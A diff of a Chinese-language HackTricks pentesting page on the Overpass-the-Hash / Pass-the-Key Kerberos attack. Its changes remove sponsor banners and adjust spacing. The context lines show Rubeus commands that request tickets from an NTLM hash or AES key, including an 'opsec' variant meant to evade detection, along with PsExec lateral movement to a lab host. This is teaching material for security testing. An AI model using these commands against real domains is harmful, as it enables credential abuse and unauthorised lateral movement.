@@ -2,9 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 ## Overpass The Hash/Pass The Key (PTK)
 
@@ -27,9 +24,9 @@ python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
-该方法与**Pass the Key**方法相似，重点在于直接控制和利用票证进行身份验证。需要注意的是，TGT请求的启动会触发事件`4768: A Kerberos authentication ticket (TGT) was requested`，这表明默认使用RC4-HMAC，尽管现代Windows系统更倾向于使用AES256。
+该方法与 **Pass the Key** 方法相似，重点在于直接控制和利用票证进行身份验证。需要注意的是，TGT 请求的发起会触发事件 `4768: A Kerberos authentication ticket (TGT) was requested`，这表明默认使用 RC4-HMAC，尽管现代 Windows 系统更倾向于使用 AES256。
 
-为了符合操作安全并使用AES256，可以应用以下命令：
+为了符合操作安全并使用 AES256，可以应用以下命令：
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
@@ -37,8 +34,5 @@ python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 
 - [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
